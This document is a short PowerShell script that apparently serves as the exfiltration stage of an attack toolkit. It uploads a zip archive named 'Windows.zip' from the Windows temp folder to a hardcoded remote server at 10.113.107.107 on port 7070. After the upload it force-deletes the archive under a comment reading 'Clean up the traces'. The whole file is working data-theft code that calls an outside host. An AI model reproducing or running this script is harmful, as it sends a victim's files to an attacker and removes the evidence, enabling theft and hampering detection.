# Upload to http server
function Upload-File {
    param (
        [string]$FilePath,
        [string]$URL
    )

    # Validate path
    if (!(Test-Path $FilePath)) {
        Write-Host "Error: $FilePath does not exist" -ForegroundColor Red
        return
    }

    # Create multipart form-data boundary
    $Boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    # Read the file contents
    $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $FileBase64 = [System.Convert]::ToBase64String($FileBytes)
    $FileName = [System.IO.Path]::GetFileName($FilePath)

    # Build the multipart form-data body
    $Body = (
        "--$Boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"",
        "Content-Type: application/octet-stream$LF",
        [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($FileBytes),
        "--$Boundary--$LF"
    ) -join $LF

    # Headers
    $Headers = @{
        "Content-Type" = "multipart/form-data; boundary=$Boundary"
    }

    # Upload the file using Invoke-WebRequest
    try {
        $Response = Invoke-WebRequest -Uri $URL -Method Post -Headers $Headers -Body $Body
        Write-Host "Success: File uploaded successfully" -ForegroundColor Green
    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    }

    # Clean up the traces
    try {
        Remove-Item -Path $FilePath -Force -ErrorAction Stop
        Write-Host "Info: $FilePath removed successfully." -ForegroundColor Green
    } catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}


# Default Remote Server
$RHOST = "10.113.107.107"
$RPORT = "7070"
if ($args.Count -gt 0) {
    $rhost = $args[0]
} else {
    $rhost = $RHOST
}


# File Uploading
$destinationPath = [System.Environment]::GetFolderPath('Temp')
$zipFileName = "Windows"
$zipFilePath = "$destinationPath\$zipFileName.zip"
Write-Host "File Uploading....." -ForegroundColor Blue
$uploadServer = "http://${rhost}:$RPORT/upload"
Write-Host "Info: Using Remote Server: $uploadServer" -ForegroundColor Green
Upload-File -FilePath $zipFilePath -URL $uploadServer 